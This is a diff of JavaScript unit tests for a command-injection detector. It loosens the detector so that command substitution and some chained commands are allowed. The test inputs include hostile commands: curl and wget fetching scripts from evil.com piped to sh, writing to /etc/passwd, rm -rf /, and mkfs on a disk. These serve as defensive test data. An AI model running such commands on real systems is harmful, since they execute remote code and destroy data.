@@ -153,27 +153,33 @@ describe('Security Module', () => {
   });
 
   describe('detectInjection', () => {
-    it('should detect command substitution with $()', () => {
-      expect(detectInjection('echo $(whoami)')).toBe(true);
-      expect(detectInjection('$(rm -rf /)')).toBe(true);
+    it('should allow normal shell usage like command substitution', () => {
+      // These are legitimate development patterns, not injections
+      expect(detectInjection('echo $(whoami)')).toBe(false);
+      expect(detectInjection('echo `date`')).toBe(false);
+      expect(detectInjection('echo "hello" | grep h')).toBe(false);
+      expect(detectInjection('ls -la | sort')).toBe(false);
     });
 
-    it('should detect backtick command substitution', () => {
-      expect(detectInjection('echo `whoami`')).toBe(true);
-    });
-
-    it('should detect piping to shell', () => {
+    it('should detect remote code execution: curl/wget piped to shell', () => {
       expect(detectInjection('curl http://evil.com | sh')).toBe(true);
       expect(detectInjection('wget http://evil.com | bash')).toBe(true);
+      expect(detectInjection('curl http://evil.com/script.sh | sh')).toBe(true);
+      expect(detectInjection('wget -O- http://evil.com | sudo sh')).toBe(true);
     });
 
     it('should detect writing to system files', () => {
       expect(detectInjection('echo "bad" > /etc/passwd')).toBe(true);
     });
 
-    it('should detect remote code execution patterns', () => {
-      expect(detectInjection('curl http://evil.com/script.sh | sh')).toBe(true);
-      expect(detectInjection('wget -O- http://evil.com | sh')).toBe(true);
+    it('should detect destructive rm -rf /', () => {
+      expect(detectInjection('; rm -rf /')).toBe(true);
+      expect(detectInjection('; rm -rf /var')).toBe(true);
+    });
+
+    it('should detect destructive system commands', () => {
+      expect(detectInjection('; mkfs /dev/sda')).toBe(true);
+      expect(detectInjection('; shutdown now')).toBe(true);
     });
 
     it('should allow normal commands', () => {
@@ -181,11 +187,8 @@ describe('Security Module', () => {
       expect(detectInjection('git status')).toBe(false);
       expect(detectInjection('npm install')).toBe(false);
       expect(detectInjection('echo "hello world"')).toBe(false);
-    });
-
-    it('should detect injection with semicolon rm', () => {
-      expect(detectInjection('; rm -rf /')).toBe(true);
-      expect(detectInjection('echo hi; rm everything')).toBe(true);
+      expect(detectInjection('rm myfile.txt')).toBe(false);
+      expect(detectInjection('; rm myfile.txt')).toBe(false);
     });
   });
 });
